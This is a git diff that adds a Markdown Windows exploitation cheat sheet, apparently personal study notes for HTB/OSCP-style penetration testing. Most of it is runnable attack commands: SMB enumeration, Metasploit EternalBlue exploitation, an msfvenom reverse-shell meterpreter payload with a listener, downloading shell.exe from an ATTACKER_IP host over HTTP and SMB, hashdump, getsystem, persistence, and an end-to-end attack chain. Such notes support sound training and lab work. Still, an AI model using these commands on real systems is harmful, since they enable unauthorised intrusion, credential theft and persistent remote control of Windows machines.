@@ -481,3 +481,397 @@ Recon → Fingerprint → Enumerate → Exploit → Payload Execution → Meterp
 ```
 
 ---
+# 🪟 Windows Exploitation Cheat Sheet (HTB / OSCP / Pentest)
+
+---
+
+# 1️⃣ Windows Host Identification
+
+## TTL Fingerprinting
+
+|Command|Purpose|
+|---|---|
+|`ping TARGET_IP`|Identify OS via TTL|
+
+|TTL|OS|
+|---|---|
+|128|Windows|
+|64|Linux|
+|255|Network device|
+
+Example:
+
+```bash
+ping 192.168.1.10
+```
+
+---
+
+## Nmap OS Detection
+
+```bash
+nmap -O -v TARGET_IP
+```
+
+```bash
+nmap -A TARGET_IP
+```
+
+Look for:
+
+```text
+Microsoft Windows
+microsoft-ds
+msrpc
+netbios-ssn
+```
+
+---
+
+# 2️⃣ Important Windows Ports
+
+|Port|Service|
+|---|---|
+|135|RPC|
+|139|NetBIOS|
+|445|SMB|
+|3389|RDP|
+|5985|WinRM|
+|80|IIS|
+
+---
+
+# 3️⃣ SMB Enumeration
+
+```bash
+nmap -p445 --script smb-enum-shares TARGET_IP
+```
+
+```bash
+smbclient -L TARGET_IP
+```
+
+```bash
+enum4linux TARGET_IP
+```
+
+---
+
+# 4️⃣ Banner Grabbing
+
+```bash
+nmap --script banner TARGET_IP
+```
+
+```bash
+nc TARGET_IP 445
+```
+
+---
+
+# 5️⃣ Vulnerability Scanning
+
+Check EternalBlue:
+
+```bash
+use auxiliary/scanner/smb/smb_ms17_010
+```
+
+```bash
+set RHOSTS TARGET_IP
+run
+```
+
+---
+
+# 6️⃣ EternalBlue Exploitation
+
+```bash
+use exploit/windows/smb/ms17_010_psexec
+```
+
+```bash
+set RHOSTS TARGET_IP
+set LHOST ATTACKER_IP
+set LPORT 4444
+exploit
+```
+
+---
+
+# 7️⃣ Meterpreter Commands
+
+|Command|Purpose|
+|---|---|
+|sysinfo|System info|
+|getuid|Current user|
+|shell|CMD shell|
+|ls|List files|
+|pwd|Current directory|
+|upload file|Upload file|
+|download file|Download file|
+
+---
+
+# 8️⃣ Get CMD Shell
+
+```bash
+meterpreter > shell
+```
+
+CMD prompt:
+
+```cmd
+C:\Windows\system32>
+```
+
+---
+
+# 9️⃣ CMD Enumeration
+
+```cmd
+whoami
+```
+
+```cmd
+hostname
+```
+
+```cmd
+ipconfig
+```
+
+```cmd
+systeminfo
+```
+
+```cmd
+net users
+```
+
+```cmd
+net localgroup administrators
+```
+
+---
+
+# 🔟 PowerShell Enumeration
+
+Start PowerShell:
+
+```cmd
+powershell
+```
+
+Commands:
+
+```powershell
+whoami
+```
+
+```powershell
+Get-Process
+```
+
+```powershell
+Get-Service
+```
+
+```powershell
+Get-LocalUser
+```
+
+```powershell
+Get-NetIPConfiguration
+```
+
+---
+
+# 1️⃣1️⃣ Payload Creation (MSFvenom)
+
+## Windows Payload
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
+```
+
+## Listener
+
+```bash
+use exploit/multi/handler
+```
+
+```bash
+set payload windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 4444
+exploit
+```
+
+---
+
+# 1️⃣2️⃣ File Transfer
+
+## Python HTTP Server
+
+```bash
+python3 -m http.server 8000
+```
+
+Download on Windows:
+
+```powershell
+wget http://ATTACKER_IP:8000/shell.exe -OutFile shell.exe
+```
+
+---
+
+## SMB Transfer
+
+```bash
+impacket-smbserver share .
+```
+
+Windows:
+
+```cmd
+copy \\ATTACKER_IP\share\shell.exe shell.exe
+```
+
+---
+
+# 1️⃣3️⃣ Privilege Escalation
+
+Meterpreter:
+
+```bash
+getsystem
+```
+
+```bash
+hashdump
+```
+
+Manual:
+
+```cmd
+whoami /priv
+```
+
+```cmd
+net localgroup administrators
+```
+
+---
+
+# 1️⃣4️⃣ Persistence
+
+Meterpreter:
+
+```bash
+run persistence
+```
+
+---
+
+# 1️⃣5️⃣ Identify Shell Type
+
+|Prompt|Shell|
+|---|---|
+|C:\Windows\system32>|CMD|
+|PS C:\Windows\system32>|PowerShell|
+|meterpreter >|Meterpreter|
+
+---
+
+# 1️⃣6️⃣ Common Windows Payload Types
+
+|Type|Extension|
+|---|---|
+|Executable|.exe|
+|DLL|.dll|
+|Batch|.bat|
+|PowerShell|.ps1|
+|Installer|.msi|
+
+---
+
+# 1️⃣7️⃣ Quick Exploitation Workflow
+
+```bash
+nmap -A TARGET_IP
+```
+
+```bash
+msfconsole
+```
+
+```bash
+search eternalblue
+```
+
+```bash
+use exploit/windows/smb/ms17_010_psexec
+```
+
+```bash
+set RHOSTS TARGET_IP
+set LHOST ATTACKER_IP
+exploit
+```
+
+```bash
+meterpreter > shell
+```
+
+---
+
+# 1️⃣8️⃣ Most Important Commands (Exam Quick Use)
+
+|Task|Command|
+|---|---|
+|Scan target|nmap -A TARGET_IP|
+|Start Metasploit|msfconsole|
+|Check vulnerability|smb_ms17_010|
+|Exploit target|exploit/windows/smb/ms17_010_psexec|
+|Create payload|msfvenom|
+|Get shell|meterpreter > shell|
+|Priv esc|getsystem|
+
+---
+
+# 1️⃣9️⃣ Windows Post-Exploitation Basics
+
+```cmd
+whoami
+```
+
+```cmd
+systeminfo
+```
+
+```cmd
+ipconfig
+```
+
+```cmd
+netstat -ano
+```
+
+```cmd
+tasklist
+```
+
+---
+
+# 2️⃣0️⃣ Full Attack Chain
+
+```text
+Recon → Scan → Identify Windows → Enumerate SMB → Exploit → Payload → Meterpreter → SYSTEM Shell
+```
+
+---
+
+### Exercises
+
+![[Pasted image 20260216104505.png]]
